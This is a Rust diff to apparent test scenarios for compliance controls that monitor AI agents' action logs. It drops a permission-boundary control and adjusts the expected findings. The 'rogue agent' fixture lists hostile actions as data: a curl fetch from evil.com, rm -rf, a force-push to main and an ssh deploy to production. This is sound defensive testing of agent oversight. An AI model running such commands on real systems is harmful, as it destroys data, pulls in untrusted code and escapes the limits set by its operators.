@@ -32,12 +32,11 @@ fn check_run(name: &str, conclusion: CheckConclusion) -> CheckRunEvidence {
     }
 }
 
-fn agent_action(tool: &str, command: &str, perm: Option<&str>) -> AgentAction {
+fn agent_action(tool: &str, command: &str) -> AgentAction {
     AgentAction {
         tool: tool.to_string(),
         command: command.to_string(),
         timestamp: None,
-        required_permission: perm.map(String::from),
     }
 }
 
@@ -57,26 +56,17 @@ fn scenario_1_happy_path() -> EvidenceBundle {
             agent_id: "agent-alpha".to_string(),
             session_id: "session-001".to_string(),
             actions: vec![
-                agent_action("cargo", "cargo build", Some("execute:build")),
-                agent_action("cargo", "cargo test", Some("execute:test")),
-                agent_action("git", "git add src/auth.rs", Some("write:repo")),
-                agent_action("git", "git add tests/auth_test.rs", Some("write:repo")),
-                agent_action(
-                    "git",
-                    "git commit -m 'feat: add auth module'",
-                    Some("write:repo"),
-                ),
+                agent_action("cargo", "cargo build"),
+                agent_action("cargo", "cargo test"),
+                agent_action("git", "git add src/auth.rs"),
+                agent_action("git", "git add tests/auth_test.rs"),
+                agent_action("git", "git commit -m 'feat: add auth module'"),
             ],
         }),
         agent_spec: EvidenceState::complete(AgentSpec {
             allowed_paths: vec!["src/*".to_string(), "tests/*".to_string()],
             forbidden_paths: vec![".env".to_string(), "secrets/".to_string()],
             allowed_tools: vec!["cargo".to_string(), "git".to_string()],
-            granted_permissions: vec![
-                "execute:build".to_string(),
-                "execute:test".to_string(),
-                "write:repo".to_string(),
-            ],
             max_steps: Some(200),
             budget_cents: Some(5000),
             ..Default::default()
@@ -109,22 +99,17 @@ fn scenario_2_rogue_agent() -> EvidenceBundle {
             agent_id: "agent-rogue".to_string(),
             session_id: "session-666".to_string(),
             actions: vec![
-                agent_action("shell", "cargo build", Some("execute:build")),
-                agent_action("shell", "rm -rf /tmp/cache", Some("execute:shell")),
-                agent_action("git", "git push --force origin main", Some("write:repo")),
-                agent_action(
-                    "curl",
-                    "curl https://evil.com/payload",
-                    Some("network:external"),
-                ),
-                agent_action("ssh", "ssh prod-server deploy", Some("network:ssh")),
+                agent_action("shell", "cargo build"),
+                agent_action("shell", "rm -rf /tmp/cache"),
+                agent_action("git", "git push --force origin main"),
+                agent_action("curl", "curl https://evil.com/payload"),
+                agent_action("ssh", "ssh prod-server deploy"),
             ],
         }),
         agent_spec: EvidenceState::complete(AgentSpec {
             allowed_paths: vec!["src/*".to_string()],
             forbidden_paths: vec![".env".to_string(), "secrets/*".to_string()],
             allowed_tools: vec!["cargo".to_string()],
-            granted_permissions: vec!["execute:build".to_string(), "write:repo".to_string()],
             max_steps: Some(100),
             budget_cents: Some(2000),
             ..Default::default()
@@ -188,7 +173,6 @@ fn scenario_3_degraded_monitoring() -> EvidenceBundle {
             allowed_paths: vec!["src/*".to_string(), "tests/*".to_string()],
             forbidden_paths: vec![".env".to_string()],
             allowed_tools: vec!["cargo".to_string(), "git".to_string()],
-            granted_permissions: vec!["execute:build".to_string(), "write:repo".to_string()],
             max_steps: Some(200),
             budget_cents: Some(5000),
             ..Default::default()
@@ -215,7 +199,6 @@ fn scenario_3_degraded_monitoring() -> EvidenceBundle {
 const AIOPS_CONTROL_IDS: &[&str] = &[
     builtin::HARNESS_RESULT,
     builtin::DESTRUCTIVE_ACTION_DETECTION,
-    builtin::AGENT_PERMISSION_BOUNDARY,
     builtin::AGENT_SPEC_CONFORMANCE,
     builtin::PRIVILEGED_OPERATION_AUDIT,
 ];
@@ -327,8 +310,8 @@ fn main() {
 
     assert_eq!(
         results_1.len(),
-        5,
-        "Scenario 1: expected 5 aiops findings, got {}",
+        4,
+        "Scenario 1: expected 4 aiops findings, got {}",
         results_1.len()
     );
     for r in &results_1 {
@@ -359,8 +342,8 @@ fn main() {
 
     assert_eq!(
         results_2.len(),
-        5,
-        "Scenario 2: expected 5 aiops findings, got {}",
+        4,
+        "Scenario 2: expected 4 aiops findings, got {}",
         results_2.len()
     );
 
@@ -377,16 +360,6 @@ fn main() {
         destruct_2.subjects.len() >= 2,
         "Expected at least 2 destructive actions, got: {:?}",
         destruct_2.subjects
-    );
-
-    // agent-permission-boundary: execute:shell, network:external, network:ssh not granted
-    let perm_2 = find_result(&results_2, builtin::AGENT_PERMISSION_BOUNDARY);
-    assert_eq!(perm_2.status, ControlStatus::Violated);
-    assert_eq!(perm_2.decision, GateDecision::Fail);
-    assert!(
-        perm_2.subjects.len() >= 2,
-        "Expected at least 2 permission violations, got: {:?}",
-        perm_2.subjects
     );
 
     // agent-spec-conformance: forbidden paths, unauthorized tools, over budget/steps
@@ -407,7 +380,7 @@ fn main() {
     assert_eq!(priv_2.status, ControlStatus::Violated);
     assert_eq!(priv_2.subjects.len(), 2);
 
-    println!("  [PASS] Scenario 2: All 5 controls Violated/Fail");
+    println!("  [PASS] Scenario 2: All 4 controls Violated/Fail");
 
     // Print violation details for Scenario 2 to verify quality
     println!("\n  Violation details (Scenario 2):");
@@ -428,8 +401,8 @@ fn main() {
 
     assert_eq!(
         results_3.len(),
-        5,
-        "Scenario 3: expected 5 aiops findings, got {}",
+        4,
+        "Scenario 3: expected 4 aiops findings, got {}",
         results_3.len()
     );
 
@@ -455,11 +428,6 @@ fn main() {
         "aiops preset maps Indeterminate to Review"
     );
 
-    // agent-permission-boundary: action log missing -> Indeterminate
-    let perm_3 = find_result(&results_3, builtin::AGENT_PERMISSION_BOUNDARY);
-    assert_eq!(perm_3.status, ControlStatus::Indeterminate);
-    assert_eq!(perm_3.decision, GateDecision::Review);
-
     // agent-spec-conformance: execution missing -> Indeterminate
     let spec_3 = find_result(&results_3, builtin::AGENT_SPEC_CONFORMANCE);
     assert_eq!(spec_3.status, ControlStatus::Indeterminate);
@@ -470,7 +438,7 @@ fn main() {
     assert_eq!(priv_3.status, ControlStatus::Indeterminate);
     assert_eq!(priv_3.decision, GateDecision::Review);
 
-    println!("  [PASS] Scenario 3: 1 Violated + 4 Indeterminate (correct)");
+    println!("  [PASS] Scenario 3: 1 Violated + 3 Indeterminate (correct)");
 
     // ── Summary ─────────────────────────────────────────────────────────
     println!("\n{}", "=".repeat(70));
@@ -478,8 +446,8 @@ fn main() {
     println!("{}", "=".repeat(70));
     println!();
     println!("AI-ops Evaluation Summary:");
-    println!("  Scenario 1 (happy path):         5/5 Satisfied  -> all Pass");
-    println!("  Scenario 2 (rogue agent):         5/5 Violated   -> all Fail");
-    println!("  Scenario 3 (degraded monitoring): 1 Violated + 4 Indeterminate");
+    println!("  Scenario 1 (happy path):         4/4 Satisfied  -> all Pass");
+    println!("  Scenario 2 (rogue agent):         4/4 Violated   -> all Fail");
+    println!("  Scenario 3 (degraded monitoring): 1 Violated + 3 Indeterminate");
     println!("                                    -> 1 Fail + 3 Review");
 }
